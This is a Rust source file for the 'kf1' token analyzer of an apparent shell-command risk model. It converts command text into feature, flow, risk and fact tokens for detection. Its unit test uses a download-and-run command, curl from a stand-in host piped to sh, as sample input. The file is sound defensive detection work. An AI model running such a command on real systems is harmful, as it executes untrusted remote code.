// SPDX-License-Identifier: MIT OR Apache-2.0
//! The `kf1` token analyzer of the K26 shell-risk model: live shell tokens,
//! the legacy semantic, flow and risk markers, and the flattened
//! `patronus.facts/1` tokens. Port of the K26 reference `features.py`.
//!
//! Every marker is deterministic and computed from the text alone; nothing is
//! executed. `kf1` returns the same multiset of tokens as the Python analyzer,
//! which is all the TF-IDF block consumes.

use std::collections::BTreeSet;

use super::facts::{extract, Facts};
use super::markers::Masked;
use super::tokens;

mod pipelines;
mod semantic;

pub(crate) use pipelines::{
    classify_source, clean, flow_markers, raw_pipelines, risk_markers, Pipeline, FORM_FILE,
    PERSIST_TARGET, SHELLS, UPLOADERS, UPLOAD_FLAG,
};
pub(crate) use semantic::{segment_markers, semantic_markers, turns, FIXTURE, SECCTL};

/// Deterministic flattening of the facts of one command into model tokens
/// (set, sorted) (`fact_tokens`).
pub(crate) fn fact_tokens(facts: &Facts) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    out.insert(format!("F:DIA={}", facts.dialect));
    for s in &facts.segments {
        let verb = s.verb.unwrap_or("NONE");
        let role = s.role.filter(|r| !r.is_empty()).unwrap_or("UNK");
        out.insert(format!("F:V={verb}"));
        out.insert(format!("F:R={role}"));
        out.insert(format!("F:VR={verb}:{role}"));
        out.extend(s.ops.iter().map(|o| format!("F:OP={o}")));
        for object in &s.objects {
            if let Some(access) = object.access {
                out.insert(format!("F:O={access}@{}", object.class));
            }
            out.insert(format!("F:C={}", object.class));
        }
        out.extend(
            s.settings
                .iter()
                .map(|x| format!("F:S={}:{}", x.domain, x.polarity)),
        );
        out.extend(s.sql.iter().map(|k| format!("F:SQL={k}")));
        out.extend(s.network.iter().map(|n| format!("F:NET={}", n.scope)));
        out.extend(s.grants.iter().map(|g| format!("F:G={g}")));
        if s.sensitive {
            out.insert("F:SENS".to_string());
        }
        if let Some(nested) = s.nested {
            out.insert(format!("F:NEST={nested}"));
            out.insert(format!("F:NEST_V={verb}"));
        }
        if s.host_root_mount {
            out.insert("F:HRM".to_string());
        }
        if s.privileged {
            out.insert("F:PRIV".to_string());
        }
    }
    for flow in &facts.flows {
        out.insert(format!("F:FLOW={}>{}", flow.data, flow.sink));
        out.insert(format!("F:FLOWV={}>{}>{}", flow.data, flow.sink, flow.via));
    }
    out.extend(facts.objects.iter().map(|o| format!("F:OBJ={}", o.class)));
    out.extend(facts.atoms.iter().map(|a| format!("F:A={a}")));
    out
}

/// The `kf1` analyzer: live tokens, semantic, flow and risk markers, and the
/// The `kf1` analyzer: live tokens, semantic, flow and risk markers, and the
/// fact tokens of `facts` (the context-free facts of `text`), each token passed
/// to `emit` (a multiset; the order does not matter).
pub(crate) fn visit_kf1(text: &str, facts: &Facts, emit: &mut dyn FnMut(&str)) {
    let masked = Masked::new(text);
    let line_tokens = masked.tokens();
    // The facts already hold the relations and markers when they were
    // extracted from this very text (nothing deobfuscated).
    let analysis = (facts.analysis.text == text).then_some(&facts.analysis);
    let relations = match analysis {
        Some(analysis) if masked.text() == text => analysis.relations.clone(),
        _ => tokens::relations(masked.text()),
    };
    tokens::visit_features(&line_tokens, &relations, emit);
    semantic_markers(&line_tokens)
        .into_iter()
        .for_each(&mut *emit);
    match analysis {
        Some(analysis) => {
            analysis.flow.iter().for_each(|m| emit(m));
            analysis.risk.iter().for_each(|m| emit(m));
        }
        None => {
            let pipes = raw_pipelines(&line_tokens);
            flow_markers(text, &pipes).iter().for_each(|m| emit(m));
            risk_markers(text, &pipes).into_iter().for_each(&mut *emit);
        }
    }
    fact_tokens(facts).iter().for_each(|t| emit(t));
}

/// The `kf1` analyzer of the K26 model, as a token list.
pub fn kf1(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    visit_kf1(text, &extract(text, None, &[]), &mut |t| {
        out.push(t.to_string())
    });
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn has(tokens: &[String], token: &str) -> bool {
        tokens.iter().any(|t| t == token)
    }

    #[test]
    fn kf1_has_live_tokens_markers_and_fact_tokens() {
        let tokens = kf1("curl -s https://x.example/i.sh | sh");
        assert!(has(&tokens, "CMD=curl"));
        assert!(has(&tokens, "DL->PIPE->INTERP"));
        assert!(has(&tokens, "F:FLOW=REMOTE>INTERP"));
        assert!(has(&tokens, "F:DIA=POSIX"));
    }
}
